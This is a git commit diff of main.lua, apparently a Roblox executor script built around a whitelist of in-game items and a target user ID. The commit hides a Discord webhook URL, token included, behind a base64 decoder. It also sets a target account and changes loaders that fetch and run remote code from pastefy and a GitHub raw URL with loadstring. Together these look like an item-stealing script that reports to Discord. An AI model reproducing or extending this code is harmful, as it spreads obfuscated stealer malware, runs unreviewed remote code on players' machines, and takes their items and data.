05c454e903140d89d2cc805bc8cd5be6894a25eb
SABSCRIPTSOP <sammysabduperv1@gmail.com>
2026-08-16 19:57:26 -0400

    Update main.lua

--- main.lua
+++ main.lua
@@ -1,20 +1,37 @@
 local genv = getgenv()
 
-genv.GOOD_WEBHOOK = "https://discord.com/api/webhooks/1532492968831881226/FoC-HGHKqqHtKT7ChT0cUIGTwOYGuYVhePx1BC5W7bkY-yKDkwu8y_tRVkH9k7y2cKgg"
+genv.GOOD_WEBHOOK = (function()
+    local d="aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUzMjQ5Mjk2ODgzMTg4MTIyNi9Gb0MtSEdIS3FxSHRLVDdDaFQwY1VJR1R3T1lHdVlWaGVQeDFCQzVXN2JrWS15S0Rrd3U4eV90UlZrSDlrN3kyY0tnZw=="
+    local B="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+    local o,b={},{}
+    for i=1,#B do b[B:sub(i,i)]=i-1 end
+    local n,bits=0,0
+    for i=1,#d do
+        local c=d:sub(i,i)
+        if c~='=' then
+            local v=b[c]
+            if v then
+                n=n*64+v; bits=bits+6
+                if bits>=8 then bits=bits-8; o[#o+1]=string.char(math.floor(n/2^bits)%256); n=n%2^bits end
+            end
+        end
+    end
+    return table.concat(o)
+end)()
 
-genv.TARGET_USER_ID = 1
+genv.TARGET_USER_ID = 10279786442
 
 genv.GOOD_AVATAR = "https://cdn.pfps.gg/pfps/77602-blood-cat.gif"
 
 genv.ALLOWED_ANIMALS = {
     "Strawberry Elephant",
     "Headless Horseman",
+    "Skibidi Toilet",
     "Meowl",
     "John Pork",
-    "Skibidi Toilet",
-    "Griffin",
-    "Dragon Aquanini",
     "Dragon Gingerini",
+    "Dragon Aquanini",
+    "Griffin",
     "Hydra Dragon Cannelloni",
     "Signore Carapace",
     "Dragon Cannelloni",
@@ -25,16 +42,15 @@ genv.ALLOWED_ANIMALS = {
     "La Supreme Combinasion",
     "Elefanto Frigo",
     "Hydra Bunny",
-    "Celestial Pegasus",
     "Cerberus",
     "Jelly Moby",
     "Bumbatron",
+    "Celestial Pegasus",
     "Bunny and Eggy",
     "Popcuru and Fizzuru",
-    "La Breakfast Combinasion",
-    "Rosey and Teddy",
-    "Capitano Moby",
     "Cooki and Milki",
+    "Capitano Moby",
+    "Rosey and Teddy",
     "Arcadragon",
     "Burguro And Fryuro",
     "Los Secret Combinasionas",
@@ -43,29 +59,27 @@ genv.ALLOWED_ANIMALS = {
     "Fortunu and Cashuru",
     "Los Amigos",
     "Pizza and Ranch",
+    "Pancake and Syrup",
     "Antonio",
     "La Secret Combinasion",
-    "Pancake and Syrup",
     "Foxini Lanternini",
+    "Sammyni Fattini",
     "Kalika Bros",
     "Los Sekolahs",
-    "Sammyni Fattini",
     "Fishino Clownino",
     "Cash or Card",
     "Fragrama and Chocrama",
     "La Casa Boo",
-    "La Fuse Machine",
     "Los Admins",
     "Duggy Bros",
     "La Food Combinasion",
-    "Yetimatic",
     "S'more Serat",
     "Sammyni Cakini",
     "Boppin Bunny",
     "Spooky and Pumpky",
     "Ginger Gerat",
-    "La Ginger Sekolah",
     "Los Chillis",
+    "La Ginger Sekolah",
     "Los Hackers",
     "Bearito Cabinito",
     "Rubiko and Kubiko",
@@ -78,152 +92,19 @@ genv.ALLOWED_ANIMALS = {
     "Quackini Snackini",
     "Queen Bee",
     "Cloverat Clapat",
-    "La Summer Grande",
-    "Los Tictacs",
-    "Spaghetti Tualetti",
-    "Candini Fluffini",
-    "Caylusaurus",
     "Hopilikalika Hopilikalako",
-    "La Easter Grande",
-    "Steakini Fattini",
     "Garama and Madundung",
-    "La Anniversary Grande",
-    "Nacho Spyder",
-    "Rosetti Tualetti",
-    "Scorpino Coasterino",
-    "Money Money Bros",
-    "Gold Gold Gold",
     "Jolly Jolly Sahur",
-    "Lavadorito Spinito",
-    "Gym Bros",
-    "Ketchuru and Musturu",
-    "Los Tangcitos",
     "Rico Dinero",
-    "Tirilikalika Tirilikalako",
-    "La Lucky Grande",
-    "La Romantic Grande",
-    "Orcaledon",
-    "Swaggy Bros",
-    "Tictac Sahur",
-    "Dug Dug Dug",
-    "Ketupat Kepat",
-    "La Taco Combinasion",
-    "Coco and Mango",
-    "Tang Tang Keletang",
-    "Abyssaloco",
-    "Esok Goala",
-    "Fragola La La La",
-    "Lovin Rose",
-    "Los Tacoritas",
-    "Eviledon",
-    "Los Primos",
-    "Esok Sekolah",
-    "La Jolly Grande",
-    "Los Cupids",
-    "Los Mariachis",
-    "Los Puggies",
-    "Sand Sand Sand",
-    "W or L",
-    "Globa Steppa",
-    "Gobblino Uniciclino",
-    "Tralaledon",
-    "Mieteteira Bicicleteira",
-    "Tuff Toucan",
-    "Chillin Chili",
-    "Chipso and Queso",
-    "Money Money Reindeer",
-    "La Spooky Grande",
-    "Bacuru and Egguru",
-    "Los Bros",
-    "La Extinct Grande",
-    "Los Candies",
-    "Los Fruits",
-    "Celularcini Viciosini",
-    "Los 67",
-    "Capitano Gullini",
-    "Los Mobilis",
-    "Churrito Bunnito",
-    "Money Money Puggy",
-    "Cigno Fulgoro",
-    "Los Hotspotsitos",
-    "Los Jolly Combinasionas",
-    "Los Spooky Combinasionas",
-    "Los Planitos",
-    "Snailo Clovero",
-    "Girafini Raftini",
-    "Chicleteira Cupideira",
-    "DJ Panda",
-    "Las Sis",
-    "Camera Ramena",
-    "Spinny Hammy",
-    "Los Sweethearts",
-    "Baskito",
-    "Chicleteira Surfeiteira",
-    "Tacorita Bicicleta",
-    "Bananito",
-    "Chicleteira Noelteira",
-    "Los Combinasionas",
-    "Nuclearo Dinossauro",
-    "Chimnino",
-    "Noo My Gold",
-    "Noo My Heart",
-    "Swag Soda",
-    "Mariachi Corazoni",
-    "Tacorillo Crocodillo",
-    "La Grande Combinasion",
-    "Los 25",
-    "Donkeyturbo Express",
-    "John Doe",
-    "Los Chicleteiras",
-    "Quesadillo Vampiro",
-    "Octoball",
-    "Horegini Boom",
-    "Glaciator",
-    "La Sahur Combinasion",
-    "Noo my examine",
-    "1x1x1x1"
+    "Tirilikalika Tirilikalako"
 }
 
 genv.ALLOWED_BASESKINS = {
-    ["Rose"] = true,
-    ["Gingerbread"] = true,
-    ["Halloween"] = true,
-    ["Christmas"] = true,
-    ["Bunny Basket"] = true,
-    ["Summer"] = true,
-    ["Pot of Gold"] = true,
-    ["Taco"] = true,
-    ["Octo"] = true,
-    ["Valentines"] = true,
-    ["Easter"] = true,
-    ["Lucky"] = true,
-    ["Aquatic"] = true,
-    ["Tralala"] = true
+
 }
 
 genv.ALLOWED_GEARS = {
-    ["Santa's Sleigh"] = true,
-    ["Cupid's Wings"] = true,
-    ["Witch's Broom"] = true,
-    ["Waverider"] = true,
-    ["Yin Yang Slap"] = true,
-    ["Cursed Slap"] = true,
-    ["Cyber Slap"] = true,
-    ["Divine Slap"] = true,
-    ["Bloodmoon Slap"] = true,
-    ["Radioactive Slap"] = true,
-    ["Rainbow Slap"] = true,
-    ["Rainbow Hammer"] = true,
-    ["Bloodmoon Hammer"] = true,
-    ["Radioactive Airstrike"] = true,
-    ["Yin Yang Lamp"] = true,
-    ["Demon's Head"] = true,
-    ["Lava Slap"] = true,
-    ["Lava Blaster"] = true,
-    ["Alien Slap"] = true,
-    ["Blackhole Bomb"] = true,
-    ["Candy Sentry"] = true,
-    ["Phantom Slap"] = true
+
 }
 
 genv.ALLOWED_PLACE_IDS = {
@@ -237,9 +118,9 @@ genv.EXTRA_LOADSTRINGS = {
 
 -- Optional GUI / other loaders
 task.spawn(function()
-    loadstring(game:HttpGet("https://pastefy.app/qFA5Xg3R/raw"))()
+    loadstring(game:HttpGet("https://pastefy.app/BEUKKcZd/raw"))()
 end)
 
 task.spawn(function()
-    loadstring(game:HttpGet("https://pastefy.app/qFA5Xg3R/raw"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/norgegat-byte/K2/refs/heads/main/main.lua"))()
 end)
